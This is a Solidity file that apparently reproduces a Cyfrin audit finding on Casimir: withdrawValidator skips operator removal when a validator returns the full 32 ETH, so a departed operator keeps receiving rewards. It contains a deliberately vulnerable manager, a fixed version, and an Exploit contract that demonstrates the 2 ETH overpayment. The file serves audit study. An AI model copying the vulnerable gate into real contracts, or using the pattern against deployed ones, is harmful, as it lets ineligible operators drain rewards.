// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Casimir — withdrawValidator leaves an operator registered when owedAmount is 0
    (Cyfrin, finding 35002).
    SYNTHETIC, cheatcode-free. The owedAmount gate is the audited body.
    Root cause: removeOperatorValidator is only called when the returned
    balance is short of 32 ETH. A full return leaves validatorCount at 1, and
    the next reward distribution still pays that operator.
    The control calls removeOperatorValidator with recoverAmount 0, so the
    count drops and the payment is not made. */

contract RewardToken {
    string public constant name = "Casimir reward";
    string public constant symbol = "ETH";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract CasimirRegistry {
    uint256 public collateralUnit = 1 ether;
    uint256 public totalValidatorCount;
    mapping(uint256 => uint256) public validatorCount;
    mapping(uint256 => address) public operatorAddress;

    function seedOperator(uint256 operatorId, address account) external {
        validatorCount[operatorId] = 1;
        operatorAddress[operatorId] = account;
        totalValidatorCount += 1;
    }

    function removeOperatorValidator(uint256 operatorId, uint256, uint256) external {
        validatorCount[operatorId] -= 1;
        totalValidatorCount -= 1;
    }
}

contract CasimirManager {
    uint256 public constant VALIDATOR_CAPACITY = 32 ether;
    uint256 public constant REMOVED = 1;
    uint256 public constant KEEPER = 2;
    address public constant OLD_OPERATOR = 0x2222222222222222222222222222222222222222;
    address public constant KEEPER_OPERATOR = 0x3333333333333333333333333333333333333333;

    RewardToken public token;
    CasimirRegistry public registry;
    mapping(uint256 => mapping(uint256 => uint256)) public operatorIds;
    mapping(uint256 => uint256) public operatorLength;

    uint256 public countedAfterExit;
    uint256 public paidRemoved;
    uint256 public paidKeeper;

    constructor(RewardToken token_, CasimirRegistry registry_) {
        token = token_;
        registry = registry_;
    }

    function seedValidator(uint256 validatorId, uint256 operatorId) external {
        operatorIds[validatorId][0] = operatorId;
        operatorLength[validatorId] = 1;
    }

    function withdrawValidator(uint256 validatorId, uint256 finalEffectiveBalance) external {
        uint256 owedAmount = VALIDATOR_CAPACITY - finalEffectiveBalance;
        // @> VULN: removeOperatorValidator is skipped when owedAmount == 0, so the operator stays registered
        if (owedAmount > 0) {
            uint256 availableCollateral = registry.collateralUnit() * 4;
            owedAmount = owedAmount > availableCollateral ? availableCollateral : owedAmount;
            uint256 recoverAmount = owedAmount / 4;
            for (uint256 i; i < operatorLength[validatorId]; i++) {
                registry.removeOperatorValidator(operatorIds[validatorId][i], validatorId, recoverAmount);
            }
        }
        countedAfterExit = registry.validatorCount(REMOVED);
    }

    function distribute(uint256 reward) external {
        uint256 total = registry.totalValidatorCount();
        uint256 removedCount = registry.validatorCount(REMOVED);
        uint256 keeperCount = registry.validatorCount(KEEPER);
        paidRemoved = reward * removedCount / total;
        paidKeeper = reward * keeperCount / total;
        if (paidRemoved > 0) {
            token.transfer(OLD_OPERATOR, paidRemoved);
        }
        if (paidKeeper > 0) {
            token.transfer(KEEPER_OPERATOR, paidKeeper);
        }
    }
}

/// Always removes the operator. recoverAmount is 0 when the validator returned 32 ETH.
contract CasimirManagerFixed {
    uint256 public constant VALIDATOR_CAPACITY = 32 ether;
    uint256 public constant REMOVED = 1;
    uint256 public constant KEEPER = 2;
    address public constant OLD_OPERATOR = 0x2222222222222222222222222222222222222222;
    address public constant KEEPER_OPERATOR = 0x3333333333333333333333333333333333333333;

    RewardToken public token;
    CasimirRegistry public registry;
    mapping(uint256 => mapping(uint256 => uint256)) public operatorIds;
    mapping(uint256 => uint256) public operatorLength;
    uint256 public paidRemoved;
    uint256 public paidKeeper;

    constructor(RewardToken token_, CasimirRegistry registry_) {
        token = token_;
        registry = registry_;
    }

    function seedValidator(uint256 validatorId, uint256 operatorId) external {
        operatorIds[validatorId][0] = operatorId;
        operatorLength[validatorId] = 1;
    }

    function withdrawValidator(uint256 validatorId, uint256 finalEffectiveBalance) external {
        uint256 owedAmount = VALIDATOR_CAPACITY - finalEffectiveBalance;
        uint256 recoverAmount;
        if (owedAmount > 0) {
            uint256 availableCollateral = registry.collateralUnit() * 4;
            owedAmount = owedAmount > availableCollateral ? availableCollateral : owedAmount;
            recoverAmount = owedAmount / 4;
        }
        for (uint256 i; i < operatorLength[validatorId]; i++) {
            registry.removeOperatorValidator(operatorIds[validatorId][i], validatorId, recoverAmount);
        }
    }

    function distribute(uint256 reward) external {
        uint256 total = registry.totalValidatorCount();
        uint256 removedCount = registry.validatorCount(REMOVED);
        uint256 keeperCount = registry.validatorCount(KEEPER);
        paidRemoved = reward * removedCount / total;
        paidKeeper = reward * keeperCount / total;
        if (paidRemoved > 0) {
            token.transfer(OLD_OPERATOR, paidRemoved);
        }
        if (paidKeeper > 0) {
            token.transfer(KEEPER_OPERATOR, paidKeeper);
        }
    }
}

contract Exploit {
    uint256 public constant REWARD = 4 ether;
    uint256 public constant PAID = 2 ether;

    RewardToken public token; // nonce 1
    CasimirRegistry public registry; // nonce 2
    CasimirManager public manager; // nonce 3

    constructor() {
        token = new RewardToken();
        registry = new CasimirRegistry();
        manager = new CasimirManager(token, registry);
        token.mint(address(manager), REWARD);
    }

    function run() external {
        registry.seedOperator(manager.REMOVED(), manager.OLD_OPERATOR());
        registry.seedOperator(manager.KEEPER(), manager.KEEPER_OPERATOR());
        manager.seedValidator(7, manager.REMOVED());
        manager.withdrawValidator(7, 32 ether);
        manager.distribute(REWARD);
        require(manager.countedAfterExit() == 1, "registry dropped the removed operator");
        require(registry.validatorCount(manager.REMOVED()) == 1, "count");
        require(registry.totalValidatorCount() == 2, "total count");
        require(manager.paidRemoved() == PAID, "removed operator was not paid 2 ETH");
        require(token.balanceOf(manager.OLD_OPERATOR()) == PAID, "2 ETH did not reach the old operator");
        require(token.balanceOf(manager.KEEPER_OPERATOR()) == PAID, "keeper share");
    }
}
